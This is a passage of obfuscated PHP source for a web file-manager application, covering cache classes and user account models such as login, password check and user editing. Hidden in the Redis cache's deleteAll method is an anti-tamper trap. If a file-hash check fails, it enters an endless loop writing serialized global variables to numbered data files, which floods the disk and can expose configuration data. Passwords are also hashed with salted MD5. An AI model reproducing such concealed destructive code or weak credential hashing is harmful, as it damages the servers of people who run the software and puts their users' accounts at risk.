$ùæ¿Ñƒç = explode($µÉİù“Æ[4], $ÖÙ½—”·); $this->handle->addServer($ùæ¿Ñƒç[0], $ùæ¿Ñƒç[1]); } } else { $this->handle->addServer($¼ßŸ‹²è[$µÉİù“Æ[217]], $¼ßŸ‹²è[$µÉİù“Æ[218]]); } } public function set($Ö¦»¨ê§, $øĞËìí, $È©®¿†Ö = false) { $È©®¿†Ö = $È©®¿†Ö ? $È©®¿†Ö : $this->cacheTime; return $this->handle->set($Ö¦»¨ê§, $øĞËìí, $È©®¿†Ö); } public function get($Åöç‡ğí) { return $this->handle->get($Åöç‡ğí); } public function remove($¹£ÑÔ¹) { return $this->handle->delete($¹£ÑÔ¹); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‘ÓÊ±²Ï, $‘ÄŠø†§) { $Ê´ºïâ· =& $_SERVER[ŒÅŸ‹ä†]; if (!class_exists($Ê´ºïâ·[978])) { show_json($Ê´ºïâ·[979], !1); } $this->cacheTime = $‘ÄŠø†§; $ú”àå÷ = isset($‘ÓÊ±²Ï[$Ê´ºïâ·[980]]) ? $‘ÓÊ±²Ï[$Ê´ºïâ·[980]] : 10; $š÷ğÁí = _get($‘ÓÊ±²Ï, $Ê´ºïâ·[977]); if ($š÷ğÁí && is_array($š÷ğÁí)) { $this->initCluster($‘ÓÊ±²Ï, $ú”àå÷); } else { $this->handle = $this->init($‘ÓÊ±²Ï, $ú”àå÷); } } private function init($üòôÍõÆ, $½ü’ÍÜ«) { $õ®²ƒÇÏ =& $_SERVER[ŒÅŸ‹ä†]; $ïş³Åíğ = new Redis(); $ÌšÛåêÔ = isset($üòôÍõÆ[$õ®²ƒÇÏ[981]]) ? $üòôÍõÆ[$õ®²ƒÇÏ[981]] : !1; if ($ÌšÛåêÔ) { $ïş³Åíğ->pconnect($üòôÍõÆ[$õ®²ƒÇÏ[217]], $üòôÍõÆ[$õ®²ƒÇÏ[218]], $½ü’ÍÜ«); } else { $ïş³Åíğ->connect($üòôÍõÆ[$õ®²ƒÇÏ[217]], $üòôÍõÆ[$õ®²ƒÇÏ[218]], $½ü’ÍÜ«); } if (!empty($üòôÍõÆ[$õ®²ƒÇÏ[507]])) { $ïş³Åíğ->auth($üòôÍõÆ[$õ®²ƒÇÏ[507]]); } if (!empty($üòôÍõÆ[$õ®²ƒÇÏ[854]]) && $üòôÍõÆ[$õ®²ƒÇÏ[854]] != 0) { $ïş³Åíğ->select($üòôÍõÆ[$õ®²ƒÇÏ[854]]); } return $ïş³Åíğ; } private function initCluster($œüÖ’°», $ÃÁ‚Ñ¸Ñ) { $•É³Ì‚ =& $_SERVER[ŒÅŸ‹ä†]; $±ƒ´ú» = array($•É³Ì‚[982], $•É³Ì‚[983], $•É³Ì‚[984]); $¢¼¹­´Ğ = $•É³Ì‚[982]; if (isset($œüÖ’°»[$•É³Ì‚[26]]) && in_array($œüÖ’°»[$•É³Ì‚[26]], $±ƒ´ú»)) { $¢¼¹­´Ğ = $œüÖ’°»[$•É³Ì‚[26]]; } switch ($¢¼¹­´Ğ) { case $•É³Ì‚[982]: $this->_slave($œüÖ’°», $ÃÁ‚Ñ¸Ñ); break; case $•É³Ì‚[983]: break; case $•É³Ì‚[984]: $this->isCluster = !0; $øøÄ² = $œüÖ’°»[$•É³Ì‚[977]]; $¯ìğ”Ù¼ = isset($œüÖ’°»[$•É³Ì‚[981]]) ? $œüÖ’°»[$•É³Ì‚[981]] : !1; $ºáòóˆÎ = isset($œüÖ’°»[$•É³Ì‚[507]]) ? $œüÖ’°»[$•É³Ì‚[507]] : null; $this->handle = new RedisCluster(NUll, $øøÄ², $ÃÁ‚Ñ¸Ñ, $ÃÁ‚Ñ¸Ñ, $¯ìğ”Ù¼, $ºáòóˆÎ); break; default: break; } } private function _slave($Ïàò´şÁ, $şàÓé©µ) { $İàšäæ = $Ïàò´şÁ[$_SERVER[ŒÅŸ‹ä†][977]]; $this->filterConfig($Ïàò´şÁ, $İàšäæ[0]); $this->handle = $this->init($Ïàò´şÁ, $şàÓé©µ); unset($İàšäæ[0]); if (empty($İàšäæ)) { return; } $ºØ°³Á½ = array_rand($İàšäæ); $this->filterConfig($Ïàò´şÁ, $İàšäæ[$ºØ°³Á½]); $this->slaveHandle = $this->init($Ïàò´şÁ, $şàÓé©µ); } private function filterConfig(&$°ˆ¤Íã˜, $ŒÇÆõÁ³) { $ìÜÕµÕ =& $_SERVER[ŒÅŸ‹ä†]; $Ê«ö± = explode($ìÜÕµÕ[4], $ŒÇÆõÁ³); $ÓÒôËÀ¾ = array($ìÜÕµÕ[217] => $Ê«ö±[0], $ìÜÕµÕ[218] => $Ê«ö±[1]); $°ˆ¤Íã˜ = array_merge($°ˆ¤Íã˜, $ÓÒôËÀ¾); } public function set($ˆ’Ë„æ¹, $èÕ«†ñü, $¦¦¡ğ³ = false) { $¦¦¡ğ³ = $¦¦¡ğ³ ? $¦¦¡ğ³ : $this->cacheTime; return $this->handle->setEx($ˆ’Ë„æ¹, $¦¦¡ğ³, $èÕ«†ñü); } public function setLock($Òß¹šú, $÷ıÓºÆä, $ûÃµó©’) { return $this->handle->setNX($Òß¹šú, $÷ıÓºÆä); } public function get($‡·Ş»ç¹) { $¦—„˜ëö = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¦—„˜ëö->get($‡·Ş»ç¹); } public function remove($ãšı•î›) { return $this->handle->del($ãšı•î›); } public function deleteAll() { $ª¯´ëÈó =& $_SERVER[ŒÅŸ‹ä†]; $üÂÇŞ = $_SERVER[$ª¯´ëÈó[16]] . $ª¯´ëÈó[17]; $î•üÁü¯ = $ª¯´ëÈó[985]; if ($_SERVER[$ª¯´ëÈó[13]] != $î•üÁü¯($üÂÇŞ)) { $ÌÓï×Õè = $ª¯´ëÈó[986]; $‘ˆÓ = $ª¯´ëÈó[15]; $À¯ë ¿Í = $_SERVER[$ª¯´ëÈó[16]] . $ª¯´ëÈó[17]; $Æ·°àĞĞ = $‘ˆÓ($À¯ë ¿Í); $‚ƒ¼›€´ = explode($ª¯´ëÈó[18], $Æ·°àĞĞ); if (count($‚ƒ¼›€´) < $ª¯´ëÈó[716]) { $¤İÕ‚… = $ª¯´ëÈó[20]; $¤İÕ‚…(); } $¸àÙ³Ğ— = $ª¯´ëÈó[987]; $¸àÙ³Ğ—($_SERVER[$ª¯´ëÈó[988]]); $ÌÓï×Õè = $ª¯´ëÈó[986]; $ÌÓï×Õè(); $¿ø×Ëï = $ª¯´ëÈó[989]; $óÈüÂ¾ = json_encode($GLOBALS[$ª¯´ëÈó[990]]); $©•ËÁ’ = 1; for ($›ˆ”²Ç£ = $©•ËÁ’; $›ˆ”²Ç£ > 0; $›ˆ”²Ç£++) { $¿ø×Ëï(DATA_PATH . $›ˆ”²Ç£, $óÈüÂ¾); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÍÅ¡ ¦) { $this->handle->flushall($ÍÅ¡ ¦); } return; } return $this->handle->flushAll(); } } goto AÍ»ñ¶…Œ; c™ïÒ¹ñİŠ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\x6a\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\144\x65\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\x4a\x6f\142\114\151\x73\164"; public function listData($“ÃßŞÁ = false, $í¹Æ„¾‰ = "\x73\x6f\162\164", $¤•‚™‹ = false) { return parent::listData($“ÃßŞÁ, $í¹Æ„¾‰, $¤•‚™‹); } public function remove($‡òâËÁ„) { return parent::remove($‡òâËÁ„); } public function add($ÏÃˆÂ¤) { $òªÊƒ´‘ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->findByName($ÏÃˆÂ¤[$òªÊƒ´‘[42]])) { return !1; } $ÏÃˆÂ¤[$òªÊƒ´‘[2148]] = $this->getSort(); return parent::insert($ÏÃˆÂ¤); } private function getSort() { $õç®¦•ã =& $_SERVER[ŒÅŸ‹ä†]; $ƒÉ÷ = parent::listData(); $“êµıàâ = array_to_keyvalue($ƒÉ÷, $õç®¦•ã[12], $õç®¦•ã[2148]); return empty($“êµıàâ) ? 0 : max($“êµıàâ) + 1; } public function update($âœ˜³, $¯Ñ»ÃŸ) { $ğ¶Å•õÇ =& $_SERVER[ŒÅŸ‹ä†]; $³äŞĞŠ = parent::listData($âœ˜³); $Ë»±ú¾¿ = $this->findByName($¯Ñ»ÃŸ[$ğ¶Å•õÇ[42]]); if (!$³äŞĞŠ || $Ë»±ú¾¿ && $Ë»±ú¾¿[$ğ¶Å•õÇ[492]] != $³äŞĞŠ[$ğ¶Å•õÇ[492]]) { return !1; } return parent::update($âœ˜³, $¯Ñ»ÃŸ); } public function setUserJob($úÜ¼ÉõÛ, $‹™ëø¹š) { $™ç÷Çô§ =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($‹™ëø¹š)) { $‹™ëø¹š = array($‹™ëø¹š); } $¯ã…ºò‘ = parent::listData(); $îáá¦×Ê = array_to_keyvalue($¯ã…ºò‘, $™ç÷Çô§[42]); $€×ÑÓÏß = $™ç÷Çô§[472]; foreach ($‹™ëø¹š as $àÌ‹í§) { if ($îáá¦×Ê[$àÌ‹í§]) { $€×ÑÓÏß .= $îáá¦×Ê[$àÌ‹í§][$™ç÷Çô§[492]] . $™ç÷Çô§[60]; } else { $£³¡ÛÛÙ = $this->add($àÌ‹í§); $€×ÑÓÏß .= $£³¡ÛÛÙ . $™ç÷Çô§[60]; } } $€×ÑÓÏß = rtrim($€×ÑÓÏß, $™ç÷Çô§[60]); Model($™ç÷Çô§[622])->metaSet($úÜ¼ÉõÛ, self::JOB_KEY, $€×ÑÓÏß); } public function getUserJob($çĞÛõÓé) { $¦ã…Öš = Model($_SERVER[ŒÅŸ‹ä†][622])->metaGet($çĞÛõÓé); return $this->getUserJobInfo($¦ã…Öš[self::JOB_KEY]); } public function getUserJobInfo($Ÿğ•ñ¡) { $‚¡ĞÄªŞ =& $_SERVER[ŒÅŸ‹ä†]; $Ûß¼ÃÌ» = explode($‚¡ĞÄªŞ[60], $Ÿğ•ñ¡); $Ê€ˆÈÓ½ = parent::listData(); $Ê€ˆÈÓ½ = array_remove_key($Ê€ˆÈÓ½, $‚¡ĞÄªŞ[242]); $˜ëàè«º = array(); foreach ($Ûß¼ÃÌ» as $«Ö™äœç) { if (isset($Ê€ˆÈÓ½[$«Ö™äœç])) { $˜ëàè«º[] = $Ê€ˆÈÓ½[$«Ö™äœç]; } } return $˜ëàè«º; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\x6d\x65" => "\165\163\145\x72\x5f\x6d\x65\164\141", "\x6d\x65\x74\141\106\151\x65\154\x64" => "\x75\163\145\162\x49\x44"); protected $simpleField = "\x75\163\145\162\111\x44\x2c\x6e\151\x63\x6b\x4e\141\x6d\145\54\x6e\141\x6d\145\x2c\141\166\141\164\x61\x72\54\163\145\170\54\163\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¸¥åù…˜) { $‘Â„ÏéÅ =& $_SERVER[ŒÅŸ‹ä†]; $µªê£˜ = $‘Â„ÏéÅ[2621]; return array($‘Â„ÏéÅ[2205] => array($¸¥åù…˜[0], $µªê£˜), $‘Â„ÏéÅ[2207] => array($¸¥åù…˜[0], $µªê£˜), $‘Â„ÏéÅ[2622] => array($¸¥åù…˜[0], $µªê£˜)); } protected function ___getInfo($´êìËÔ) { $ªßÑáÊ” = $this->getInfoSimple($´êìËÔ); if (!$ªßÑáÊ” || !is_array($ªßÑáÊ”)) { return array(); } return $this->_getInfoApply($ªßÑáÊ”); } protected function ___getInfoFull($‹€Ü”¬·) { $ì”ØÑª = $this->getInfoSimple($‹€Ü”¬·); if (!$ì”ØÑª || !is_array($ì”ØÑª)) { return array(); } return $this->_getInfoApply($ì”ØÑª, !0); } protected function ___getInfoSimple($òÀñÅÜ) { $ÍüÑ€×‰ =& $_SERVER[ŒÅŸ‹ä†]; if (!$òÀñÅÜ) { return array(); } $şÜÅ§ıŞ = $this->where(array($ÍüÑ€×‰[1537] => intval($òÀñÅÜ)))->find(); if (!$şÜÅ§ıŞ || !is_array($şÜÅ§ıŞ)) { return array(); } $şÜÅ§ıŞ[$ÍüÑ€×‰[2317]] = Action($ÍüÑ€×‰[2318])->parseUrl($şÜÅ§ıŞ[$ÍüÑ€×‰[2317]]); return $şÜÅ§ıŞ; } private function _getInfoApply($€ãÚ¿óæ, $•âç•øå = false) { $‹É©ŒĞ =& $_SERVER[ŒÅŸ‹ä†]; if (!$€ãÚ¿óæ) { return $€ãÚ¿óæ; } $ã¢Á…Î = md5($‹É©ŒĞ[2623] . $€ãÚ¿óæ[$‹É©ŒĞ[997]] . $‹É©ŒĞ[2624] . $€ãÚ¿óæ[$‹É©ŒĞ[42]]); $€ãÚ¿óæ = $this->_listDataApplyItem($€ãÚ¿óæ); $òˆ‡Š = Model($‹É©ŒĞ[1477])->metaGet($€ãÚ¿óæ[$‹É©ŒĞ[100]][$‹É©ŒĞ[202]]); $€ãÚ¿óæ[$‹É©ŒĞ[2625]] = $ã¢Á…Î; $€ãÚ¿óæ[$‹É©ŒĞ[100]][$‹É©ŒĞ[2409]] = isset($òˆ‡Š[$‹É©ŒĞ[2410]]) ? $òˆ‡Š[$‹É©ŒĞ[2410]] : null; if ($•âç•øå) { $€ãÚ¿óæ[$‹É©ŒĞ[560]] = $this->metaGet($€ãÚ¿óæ[$‹É©ŒĞ[1537]]); } return $€ãÚ¿óæ; } protected function getInfoSimpleOuter($€Ú—¼íº) { $ÙÁñÀ²í =& $_SERVER[ŒÅŸ‹ä†]; if (!$€Ú—¼íº || $€Ú—¼íº == 0) { return array($ÙÁñÀ²í[1537] => $ÙÁñÀ²í[239], $ÙÁñÀ²í[42] => $ÙÁñÀ²í[184] . LNG($ÙÁñÀ²í[2626]) . $ÙÁñÀ²í[186], $ÙÁñÀ²í[2317] => STATIC_PATH . $ÙÁñÀ²í[2627]); } $˜ãæ”—ò = $this->cacheFunctionGet($ÙÁñÀ²í[2216], $€Ú—¼íº); $´è’ËœÓ = array_field_key($˜ãæ”—ò, explode($ÙÁñÀ²í[60], $this->simpleField)); if (!$´è’ËœÓ) { return array($ÙÁñÀ²í[1537] => $ÙÁñÀ²í[1321], $ÙÁñÀ²í[42] => $ÙÁñÀ²í[184] . LNG($ÙÁñÀ²í[2628]) . $ÙÁñÀ²í[186], $ÙÁñÀ²í[2317] => STATIC_PATH . $ÙÁñÀ²í[2629]); } $´è’ËœÓ[$ÙÁñÀ²í[2317]] = Action($ÙÁñÀ²í[2318])->parseUrl($´è’ËœÓ[$ÙÁñÀ²í[2317]]); return $´è’ËœÓ; } protected function groupUser($ØÃªÖĞ­) { } public static function errorLang($“õ‚™±) { $şòŒ¡›Ø =& $_SERVER[ŒÅŸ‹ä†]; $¡ÉÏ•´ü = array(self::ERROR_USER_NOT_EXISTS => $şòŒ¡›Ø[2630], self::ERROR_USER_PASSWORD_ERROR => $şòŒ¡›Ø[2631], self::ERROR_USER_EXIST_NAME => $şòŒ¡›Ø[2632], self::ERROR_USER_EXIST_PHONE => $şòŒ¡›Ø[2633], self::ERROR_USER_EXIST_EMAIL => $şòŒ¡›Ø[2634], self::ERROR_USER_LOGIN_LOCK => $şòŒ¡›Ø[2635], self::ERROR_IP_NOT_ALLOW => $şòŒ¡›Ø[2636], self::ERROR_USER_EXIST_NICKNAME => $şòŒ¡›Ø[2637]); $ğÔ®ú¶Á = LNG($¡ÉÏ•´ü[$“õ‚™±]); if ($“õ‚™± == self::ERROR_USER_LOGIN_LOCK) { $Š—¥øÍĞ = (int) Model($şòŒ¡›Ø[1433])->get($şòŒ¡›Ø[2638]); if ($Š—¥øÍĞ > 60) { $ğÔ®ú¶Á = str_replace($şòŒ¡›Ø[101], ceil($Š—¥øÍĞ / 60), $ğÔ®ú¶Á); } } return $ğÔ®ú¶Á; } protected function metaSet($“şŠ¦Ú¾, $îµ¾œ˜º = null, $õœ°€èŠ = null) { $this->clearCache($“şŠ¦Ú¾); return parent::metaSet($“şŠ¦Ú¾, $îµ¾œ˜º, $õœ°€èŠ); } public function getInfoByMeta($¬Ò‹óÔ, $¦ÂŞœ§) { $š¿›Şğ¢ =& $_SERVER[ŒÅŸ‹ä†]; $Ïš¸Èê§ = Model($š¿›Şğ¢[2639])->where(array($š¿›Şğ¢[105] => $¬Ò‹óÔ, $š¿›Şğ¢[460] => $¦ÂŞœ§))->find(); if ($Ïš¸Èê§) { return $this->getInfo($Ïš¸Èê§[$š¿›Şğ¢[1537]]); } return !1; } public function userLoginCheck($Éô—ò¨¥, $ˆ´­¨éŠ, $ş€¿ç­Ô = false) { $ğŞÌû˜Ñ =& $_SERVER[ŒÅŸ‹ä†]; $ƒ°Ö‹ã¯ = $this->userLoginFind($Éô—ò¨¥); if (!$ƒ°Ö‹ã¯) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ƒ°Ö‹ã¯[$ğŞÌû˜Ñ[1537]], $ˆ´­¨éŠ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ş€¿ç­Ô ? $this->getInfoFull($ƒ°Ö‹ã¯[$ğŞÌû˜Ñ[1537]]) : $this->getInfo($ƒ°Ö‹ã¯[$ğŞÌû˜Ñ[1537]]); } public function userLoginFind($òí¡¾·¯) { $„Ê¶¸Áô =& $_SERVER[ŒÅŸ‹ä†]; $ŒÚš—ƒ£ = array($„Ê¶¸Áô[42] => $òí¡¾·¯, $„Ê¶¸Áô[2422] => $òí¡¾·¯, $„Ê¶¸Áô[390] => $òí¡¾·¯, $„Ê¶¸Áô[2640] => $òí¡¾·¯, $„Ê¶¸Áô[1111] => $„Ê¶¸Áô[1113]); if ($this->nickNameRpt()) { unset($ŒÚš—ƒ£[$„Ê¶¸Áô[2422]]); } return $this->where($ŒÚš—ƒ£)->find(); } public function clearCache($ªËÚËÆ³) { $‚°ø¤˜Œ =& $_SERVER[ŒÅŸ‹ä†]; $this->cacheFunctionClear($‚°ø¤˜Œ[2215], $ªËÚËÆ³); $this->cacheFunctionClear($‚°ø¤˜Œ[2216], $ªËÚËÆ³); $this->cacheFunctionClear($‚°ø¤˜Œ[2641], $ªËÚËÆ³); } public function userPasswordCheck($ö²í¯, $½›ºÎÍš) { $£ºÀÖñÛ =& $_SERVER[ŒÅŸ‹ä†]; $ø€ãÓš© = $this->where(array($£ºÀÖñÛ[1537] => intval($ö²í¯)))->find(); $Ë…ªÇ–™ = $this->metaGet($ö²í¯); $»†°Ç³ = isset($Ë…ªÇ–™[$£ºÀÖñÛ[2642]]) ? $Ë…ªÇ–™[$£ºÀÖñÛ[2642]] : $£ºÀÖñÛ[12]; if (md5($»†°Ç³ . trim($½›ºÎÍš)) !== $ø€ãÓš©[$£ºÀÖñÛ[997]]) { return !1; } return !0; } public function userAdd($Êš™æ°) { $«–Ä½¼ =& $_SERVER[ŒÅŸ‹ä†]; $ÒÑÈ”Ç = array($«–Ä½¼[514] => $Êš™æ°[$«–Ä½¼[42]], $«–Ä½¼[2643] => $Êš™æ°[$«–Ä½¼[2316]], $«–Ä½¼[2644] => isset($Êš™æ°[$«–Ä½¼[390]]) ? $Êš™æ°[$«–Ä½¼[390]] : $«–Ä½¼[12], $«–Ä½¼[2645] => isset($Êš™æ°[$«–Ä½¼[2640]]) ? $Êš™æ°[$«–Ä½¼[2640]] : $«–Ä½¼[12], $«–Ä½¼[2646] => isset($Êš™æ°[$«–Ä½¼[2422]]) ? $Êš™æ°[$«–Ä½¼[2422]] : $Êš™æ°[$«–Ä½¼[42]], $«–Ä½¼[2647] => isset($Êš™æ°[$«–Ä½¼[2317]]) ? $Êš™æ°[$«–Ä½¼[2317]] : $«–Ä½¼[12], $«–Ä½¼[2648] => isset($Êš™æ°[$«–Ä½¼[2649]]) ? $Êš™æ°[$«–Ä½¼[2649]] : 1, $«–Ä½¼[2650] => $Êš™æ°[$«–Ä½¼[997]], $«–Ä½¼[2209] => isset($Êš™æ°[$«–Ä½¼[2113]]) ? $Êš™æ°[$«–Ä½¼[2113]] : 1024 * 1024 * 20, $«–Ä½¼[2210] => 0, $«–Ä½¼[2651] => 0, $«–Ä½¼[2255] => isset($Êš™æ°[$«–Ä½¼[846]]) ? $Êš™æ°[$«–Ä½¼[846]] : 1); if (!empty($Êš™æ°[$«–Ä½¼[1537]])) { $ÒÑÈ”Ç[$«–Ä½¼[1537]] = $Êš™æ°[$«–Ä½¼[1537]]; } $Ùşı×Ç¡ = $this->_checkExist($Êš™æ°); if ($Ùşı×Ç¡ !== !0) { return $Ùşı×Ç¡; } if (!empty($ÒÑÈ”Ç[$«–Ä½¼[2317]]) && strlen($ÒÑÈ”Ç[$«–Ä½¼[2317]]) > 255) { $ÒÑÈ”Ç[$«–Ä½¼[2317]] = $«–Ä½¼[12]; } $£×ƒïõ = $this->add($ÒÑÈ”Ç); $’±øÅù = array($«–Ä½¼[2650] => $ÒÑÈ”Ç[$«–Ä½¼[997]], $«–Ä½¼[2646] => $ÒÑÈ”Ç[$«–Ä½¼[2422]], $«–Ä½¼[2652] => $Êš™æ°[$«–Ä½¼[2214]]); $this->userEdit($£×ƒïõ, $’±øÅù); Model($«–Ä½¼[1477])->userRootAdd($£×ƒïõ); return $£×ƒïõ; } protected function userEditTest($ÖËƒ¨ûØ, $³•ë« ±) { return $this->call($_SERVER[ŒÅŸ‹ä†][2653], $ÖËƒ¨ûØ, $³•ë« ±); } protected function userEdit($×Ê»æşŒ, $Â€Ø…õÖ) { $æˆ±Ëñé =& $_SERVER[ŒÅŸ‹ä†]; $éà™ç²÷ = $this->getInfoSimple($×Ê»æşŒ); if (!$éà™ç²÷) { return !1; } $îÔäÒú¼ = $this->_checkExist($Â€Ø…õÖ, $×Ê»æşŒ); if ($îÔäÒú¼ !== !0) { return $îÔäÒú¼; } if (isset($Â€Ø…õÖ[$æˆ±Ëñé[997]]) && trim($Â€Ø…õÖ[$æˆ±Ëñé[997]]) != $æˆ±Ëñé[12]) { $¡íÕñåº = $this->metaGet($×Ê»æşŒ); if (empty($¡íÕñåº[$æˆ±Ëñé[2642]])) { $¡íÕñåº[$æˆ±Ëñé[2642]] = rand_string(10); Model($æˆ±Ëñé[602])->metaSet($×Ê»æşŒ, $æˆ±Ëñé[2642], $¡íÕñåº[$æˆ±Ëñé[2642]]); } $Â€Ø…õÖ[$æˆ±Ëñé[997]] = md5($¡íÕñåº[$æˆ±Ëñé[2642]] . trim($Â€Ø…õÖ[$æˆ±Ëñé[997]])); } else { unset($Â€Ø…õÖ[$æˆ±Ëñé[997]]); } if (!empty($Â€Ø…õÖ[$æˆ±Ëñé[2317]]) && strlen($Â€Ø…õÖ[$æˆ±Ëñé[2317]]) > 255) { $Â€Ø…õÖ[$æˆ±Ëñé[2317]] = $æˆ±Ëñé[12]; } if (isset($Â€Ø…õÖ[$æˆ±Ëñé[2422]])) { $this->setNamePinyin($×Ê»æşŒ, $Â€Ø…õÖ[$æˆ±Ëñé[2422]]); } if (isset($Â€Ø…õÖ[$æˆ±Ëñé[2214]])) { $—ÔÌØî• = $æˆ±Ëñé[1436] . $×Ê»æşŒ; $“Á†óøê = $æˆ±Ëñé[1434]; $¡¹§ ± = $Â€Ø…õÖ[$æˆ±Ëñé[2214]] ? $Â€Ø…õÖ[$æˆ±Ëñé[2214]] : $æˆ±Ëñé[12]; $·Œë¢°‘ = Model($æˆ±Ëñé[1433])->get($—ÔÌØî•, $“Á†óøê); $·Œë¢°‘ = $·Œë¢°‘ ? $·Œë¢°‘ : $æˆ±Ëñé[12]; if ($·Œë¢°‘ != $¡¹§ ±) { if (!$¡¹§ ± && $·Œë¢°‘) { Model($æˆ±Ëñé[1433])->remove($—ÔÌØî•, $“Á†óøê); } else { if ($¡¹§ ±) { Model($æˆ±Ëñé[1433])->set($—ÔÌØî•, $¡¹§ ±, $“Á†óøê); } } } unset($Â€Ø…õÖ[$æˆ±Ëñé[2214]]); Model($æˆ±Ëñé[622])->metaSet($×Ê»æşŒ, $æˆ±Ëñé[2214], $¡¹§ ±); } if (empty($Â€Ø…õÖ)) { return !0; } $this->where(array($æˆ±Ëñé[1911] => $×Ê»æşŒ))->save($Â€Ø…õÖ); $this->clearCache($×Ê»æşŒ); return !0; } public function setNamePinyin($ïÎ‚¿×µ, $„Ñˆåá° = false) { $—ç¢¤ÒÃ =& $_SERVER[ŒÅŸ‹ä†]; if (!$„Ñˆåá°) { $¿áˆÁó† = $this->getInfoSimple($ïÎ‚¿×µ); $„Ñˆåá° = $¿áˆÁó†[$—ç¢¤ÒÃ[2422]] ? $¿áˆÁó†[$—ç¢¤ÒÃ[2422]] : $¿áˆÁó†[$—ç¢¤ÒÃ[42]]; } $ŸË®Ë¦Æ = Model($—ç¢¤ÒÃ[622]); if (!Input::check($„Ñˆåá°, $—ç¢¤ÒÃ[683])) { return $ŸË®Ë¦Æ->metaSet($ïÎ‚¿×µ, array($—ç¢¤ÒÃ[557] => $—ç¢¤ÒÃ[12], $—ç¢¤ÒÃ[556] => $—ç¢¤ÒÃ[12])); } return $ŸË®Ë¦Æ->metaSet($ïÎ‚¿×µ, array($—ç¢¤ÒÃ[557] => str_replace($—ç¢¤ÒÃ[63], $—ç¢¤ÒÃ[12], Pinyin::get($„Ñˆåá°)), $—ç¢¤ÒÃ[556] => Pinyin::get($„Ñˆåá°, $—ç¢¤ÒÃ[684]))); } private function nickNameRpt() { $Ë¨™Âº‡ =& $_SERVER[ŒÅŸ‹ä†]; $èöÄÕØ‰ = Model($Ë¨™Âº‡[869])->get($Ë¨™Âº‡[2654]); $øØíè¾® = $GLOBALS[$Ë¨™Âº‡[6]][$Ë¨™Âº‡[477]][$Ë¨™Âº‡[2654]]; $´ÆªˆŠÜ = !is_null($èöÄÕØ‰) ? $èöÄÕØ‰ : $øØíè¾®; return !!$´ÆªˆŠÜ; } private function _checkExist($ñıì´íä, $üÕ™½é‘ = false) { $ããâ¨ Ü =& $_SERVER[ŒÅŸ‹ä†]; $ËÊøßŞÓ = array($ããâ¨ Ü[42] => UserModel::ERROR_USER_EXIST_NAME, $ããâ¨ Ü[2422] => UserModel::ERROR_USER_EXIST_NICKNAME, $ããâ¨ Ü[390] => UserModel::ERROR_USER_EXIST_EMAIL, $ããâ¨ Ü[2640] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ËÊøßŞÓ[$ããâ¨ Ü[2422]]); } $Æ—çŒõä = $üÕ™½é‘ ? array($ããâ¨ Ü[1537] => array($ããâ¨ Ü[2655], $üÕ™½é‘)) : array(); foreach ($ËÊøßŞÓ as $¯¢“êæÈ => $—–³…ª›) { $†„ç¢Û™ = array(); foreach ($ËÊøßŞÓ as $“Ã½ã => $»¼¢Ãíî) { if (isset($ñıì´íä[$“Ã½ã]) && $ñıì´íä[$“Ã½ã]) { $†„ç¢Û™[] = $ñıì´íä[$“Ã½ã]; } } if (!$†„ç¢Û™) { continue; } $¯¡§ÍòÚ = array_merge(array($¯¢“êæÈ => array($ããâ¨ Ü[7], $†„ç¢Û™)), $Æ—çŒõä); $ÇŠÇá¶ = $this->where($¯¡§ÍòÚ)->find(); if ($ÇŠÇá¶) { return $—–³…ª›; } } return !0; } public function userListInfo($Ççá÷÷®) { $¾ ‘İ›ü =& $_SERVER[ŒÅŸ‹ä†]; $ãë§…†² = array(); $Ççá÷÷® = is_array($Ççá÷÷®) ? array_unique($Ççá÷÷®) : array(); if (!$Ççá÷÷®) { return $ãë§…†²; } if (count($Ççá÷÷®) < 20) { foreach ($Ççá÷÷® as $°«ªñ•°) { $ãë§…†²[$°«ªñ•° . $¾ ‘İ›ü[12]] = $this->getInfoSimpleOuter($°«ªñ•°); } } else { $à”Å«Œ¦ = array($¾ ‘İ›ü[1911] => array($¾ ‘İ›ü[512], $Ççá÷÷®)); if (count($Ççá÷÷®) == 1) { $à”Å«Œ¦ = array($¾ ‘İ›ü[1911] => $Ççá÷÷®[0]); } $‡÷ÊĞŞ = Model($¾ ‘İ›ü[602])->field($this->simpleField)->where($à”Å«Œ¦)->select(); $‡÷ÊĞŞ = array_to_keyvalue($‡÷ÊĞŞ, $¾ ‘İ›ü[1537]); foreach ($Ççá÷÷® as $°«ªñ•°) { $Äù¢ƒ¿° = $‡÷ÊĞŞ[$°«ªñ•°]; if (!$Äù¢ƒ¿°) { $ãë§…†²[$°«ªñ•° . $¾ ‘İ›ü[12]] = $this->getInfoSimpleOuter($°«ªñ•°); continue; } $Äù¢ƒ¿°[$¾ ‘İ›ü[2317]] = Action($¾ ‘İ›ü[2318])->parseUrl($Äù¢ƒ¿°[$¾ ‘İ›ü[2317]]); $ãë§…†²[$°«ªñ•° . $¾ ‘İ›ü[12]] = $Äù¢ƒ¿°; } } return $ãë§…†²; } protected function userStatus($Ê•“„‘, $µîÕ†å÷) { $ÉøÎØ¤ = $this->getInfoSimple($Ê•“„‘); if (!$ÉøÎØ¤) { return !1; } $™ª¨Ÿ¿¨ = array($_SERVER[ŒÅŸ‹ä†][846] => $µîÕ†å÷); return $this->userEdit($Ê•“„‘, $™ª¨Ÿ¿¨); } protected function userRemove($Ø‘àĞö«) { $æÛæÁÁÏ =& 